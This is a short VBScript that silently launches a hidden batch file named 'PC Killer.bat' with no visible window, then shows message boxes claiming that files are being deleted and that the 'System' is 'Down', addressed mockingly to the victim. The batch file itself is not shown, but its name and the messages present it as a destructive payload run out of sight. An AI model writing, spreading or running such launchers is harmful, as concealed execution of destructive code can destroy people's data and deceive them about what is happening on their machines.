set shell = CreateObject("Wscript.Shell")

shell.run """PC Killer.bat""", 0

a = MsgBox("Deleting Files....",0+16,"Files Deleting")
b = MsgBox("All Files Deleted.......",0+16,"Deleted...")
c = MsgBox("Now your System Down Baby...",0+16,"  Bye Bye ")